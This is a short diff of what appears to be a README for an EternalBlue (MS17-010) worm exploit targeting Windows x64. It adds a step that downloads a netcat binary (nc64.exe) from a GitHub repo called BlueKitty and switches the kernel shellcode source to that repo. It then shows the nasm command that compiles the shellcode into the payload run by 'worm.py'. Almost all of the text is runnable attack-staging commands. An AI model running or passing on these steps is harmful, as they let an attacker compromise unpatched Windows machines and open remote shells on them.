@@ -19,8 +19,11 @@ python worm.py sc_x64.bin
 
 Construct Payload for Windows x64 (Ref: https://root4loot.com/post/eternalblue_manual_exploit/)
 -------------------------------------------------------------------------------------------------
+Download nc64.exe
+wget https://github.com/chimpooo/BlueKitty/raw/main/nc64.exe
+
 Obtaining the shellcode
-wget https://raw.githubusercontent.com/worawit/MS17-010/master/shellcode/eternalblue_kshellcode_x64.asm
+wget https://raw.githubusercontent.com/chimpooo/BlueKitty/main/eternalblue_kshellcode_x64.asm
 
 Compiling the shellcode
 nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin
